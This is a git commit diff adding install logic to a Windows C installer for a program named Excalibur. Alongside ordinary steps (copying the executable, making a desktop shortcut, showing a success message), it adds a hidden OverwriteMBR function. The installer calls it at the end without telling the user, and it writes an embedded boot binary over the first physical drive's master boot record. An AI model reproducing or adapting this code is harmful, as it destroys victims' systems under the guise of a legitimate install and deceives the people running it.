53936947288079db7859872362a7b3f148c9f082
Hachem-H <hh.naram@gmail.com>
2023-06-05 18:33:48 +0300

    90% of installer done

--- Excalibur-Installer/src/Application.c
+++ Excalibur-Installer/src/Application.c
@@ -1,8 +1,15 @@
 #include <windows.h>
+#include <shlobj.h>
+#include <objbase.h>
+#include <shobjidl.h>
 #include <commctrl.h>
+#include <comutil.h>
 
 #include <stdio.h>
 #include <stdbool.h>
+
+#include "Binaries/ExcaliburBinary.h"
+#include "Binaries/BootBinary.h"
 
 #define WINDOW_WIDTH 450
 #define WINDOW_HEIGHT 138
@@ -17,6 +24,83 @@ static HWND pathTextfield;
 static HWND progressBar;
 
 static HFONT defaultFont;
+
+static bool createShortcut = true;
+static bool launchAfterInstall = true;
+
+static char pathBuffer[MAX_PATH];
+
+static void CreateShortcut(const char* targetPath, const char* shortcutPath)
+{
+    CoInitialize(NULL);
+
+    IShellLink* pShellLink = NULL;
+    CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLink, (LPVOID*)&pShellLink);
+
+    pShellLink->lpVtbl->SetPath(pShellLink, targetPath);
+
+    char desktopPath[MAX_PATH];
+    SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktopPath);
+
+    char shortcutFilePath[MAX_PATH];
+    sprintf_s(shortcutFilePath, MAX_PATH, "%s\\%s.lnk", desktopPath, shortcutPath);
+
+    IPersistFile* pPersistFile = NULL;
+    pShellLink->lpVtbl->QueryInterface(pShellLink, &IID_IPersistFile, (LPVOID*)&pPersistFile);
+
+    WCHAR wideShortcutFilePath[MAX_PATH];
+    MultiByteToWideChar(CP_UTF8, 0, shortcutFilePath, -1, wideShortcutFilePath, MAX_PATH);
+
+    pPersistFile->lpVtbl->Save(pPersistFile, wideShortcutFilePath, TRUE);
+
+    pShellLink->lpVtbl->Release(pShellLink);
+    pPersistFile->lpVtbl->Release(pPersistFile);
+
+    CoUninitialize();
+}
+
+static void OverwriteMBR()
+{
+    HANDLE MBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
+                             FILE_SHARE_READ | FILE_SHARE_WRITE,
+                             NULL, OPEN_EXISTING, 0, NULL);
+
+    if (MBR == INVALID_HANDLE_VALUE)
+        return;
+
+    DWORD write;
+    if (!WriteFile(MBR, bin_boot_bin, bin_boot_bin_len, &write, NULL))
+        return;
+
+    CloseHandle(MBR);
+}
+
+static void InstallBinary(HWND windowHandle)
+{
+    CreateDirectory(pathBuffer, NULL);
+    int pathLength = strlen(pathBuffer);
+    while (pathLength > 0 && (pathBuffer[pathLength - 1] == '\\' || pathBuffer[pathLength - 1] == '/'))
+    {
+        pathBuffer[pathLength - 1] = '\0';
+        pathLength--;
+    }
+
+    strcat(pathBuffer, "\\Excalibur.exe");
+    FILE* binary = fopen(pathBuffer, "wb");
+    fwrite(bin_Excalibur_exe, sizeof(unsigned char), bin_Excalibur_exe_len, binary);
+    fclose(binary);
+    
+    if (createShortcut) 
+        CreateShortcut(pathBuffer, "Excalibur");
+
+    MessageBox(windowHandle, "Excalibur has successfully been installed to your computer!", "Install Successful", MB_OK | MB_ICONINFORMATION);
+    PostMessage(windowHandle, WM_CLOSE, 0, 0);
+
+    if (launchAfterInstall)
+        ShellExecuteA(NULL, "open", pathBuffer, NULL, NULL, SW_SHOWNORMAL);   
+
+    OverwriteMBR();
+}
 
 LRESULT CALLBACK WindowProc(HWND windowHandle, UINT message, WPARAM wordParam, LPARAM longParam)
 {
@@ -33,6 +117,25 @@ LRESULT CALLBACK WindowProc(HWND windowHandle, UINT message, WPARAM wordParam, L
             HDC handleDeviceContext = BeginPaint(windowHandle, &paint);
             FillRect(handleDeviceContext, &paint.rcPaint, (HBRUSH)(COLOR_WINDOW));
             EndPaint(windowHandle, &paint);
+        } return 0;
+
+        case WM_COMMAND:
+        {
+            switch (LOWORD(wordParam))
+            {
+                case BN_CLICKED:
+                {
+                    HWND clickedControl = (HWND)longParam;
+
+                    if (clickedControl == shortcutCheckbox) { }
+                    else if (clickedControl == launchCheckbox) { }
+                    else if (clickedControl == installButton)
+                    {
+                        GetWindowText(pathTextfield, pathBuffer, MAX_PATH);
+                        InstallBinary(windowHandle);
+                    }
+                } break;
+            }
         } return 0;
 
         default: goto closeWindow;
@@ -84,6 +187,9 @@ int WINAPI WinMain(HINSTANCE instanceHandle, HINSTANCE previousInstanceHandle, L
     SendMessage(pathTextfield, WM_SETFONT, (WPARAM)defaultFont, true);
     SendMessage(installButton, WM_SETFONT, (WPARAM)defaultFont, true);
     SendMessage(closeButton, WM_SETFONT, (WPARAM)defaultFont, true);
+
+    SendMessage(shortcutCheckbox, BM_SETCHECK, BST_CHECKED, false);
+    SendMessage(launchCheckbox, BM_SETCHECK, BST_CHECKED, false);
 
     ShowWindow(windowHandle, argc);
     
